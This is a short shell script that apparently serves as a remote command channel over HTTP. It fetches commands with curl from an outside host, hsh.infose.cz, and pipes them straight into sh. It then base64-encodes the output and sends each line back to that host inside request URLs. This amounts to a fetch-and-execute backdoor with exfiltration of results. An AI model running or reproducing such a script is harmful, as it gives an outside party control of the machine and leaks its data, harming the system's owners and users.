set -eu
H=https://hsh.infose.cz

i=0
while :; do
        curl -s "${H}/$$-$i" | sh | base64 | while read line; do
                curl -s "${H}/r-$$-$i-$line"
        done
        i=$(( $i + 1 ))
        break
done
